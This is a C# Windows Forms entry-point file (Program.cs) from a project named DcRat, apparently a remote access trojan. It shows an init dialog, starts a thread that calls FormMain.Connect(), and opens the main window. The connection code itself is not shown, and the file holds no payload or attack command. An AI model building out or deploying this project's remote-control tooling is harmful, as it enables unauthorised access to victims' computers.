using System;
using System.Collections.Generic;
using System.Linq;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace DcRat
{
    static class Program
    {
        /// <summary>
        /// 应用程序的主入口点。
        /// </summary>
        [STAThread]
        static void Main()
        {
            Application.EnableVisualStyles();
            Application.SetCompatibleTextRenderingDefault(false);
            using (FormInit formInit = new FormInit())
            {
                formInit.ShowDialog();
            }
            new Thread(() =>
            {
                FormMain.Connect();
            }).Start();
            Application.Run(new FormMain());
        }
    }
}
